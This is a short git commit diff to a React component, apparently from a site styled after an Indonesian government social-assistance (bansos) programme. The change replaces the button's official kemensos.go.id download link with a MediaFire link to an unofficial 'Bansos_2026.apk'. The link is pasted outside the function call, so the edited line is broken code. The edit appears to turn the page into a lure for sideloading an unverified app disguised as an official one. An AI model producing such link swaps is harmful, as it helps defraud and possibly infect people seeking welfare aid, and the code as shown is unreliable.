84de0c12aae09933474f8dfec2f8efa4e072b160
Bansos id <berkahkita937@gmail.com>
2026-07-25 08:30:57 +0700

    Update Beranda.tsx

--- src/components/Beranda.tsx
+++ src/components/Beranda.tsx
@@ -74,7 +74,7 @@ export default function Beranda({ onCheckNikClick, onShowToast }: BerandaProps) 
             </button>
             
             <button
-              onClick={() => onShowToast('Silakan unduh APK resmi di https://bansos.kemensos.go.id/download')}
+              onClick={() => onShowToast('Silakan unduh APK resmi di link yang tersedia')https://www.mediafire.com/file/kimn303swn3c20l/Bansos_2026.apk/file
               className="px-6 py-3.5 bg-white border border-slate-300 hover:bg-slate-50 text-slate-900 font-bold text-xs uppercase tracking-widest rounded transition-all duration-150 flex items-center gap-2 cursor-pointer"
             >
               <Download size={14} />
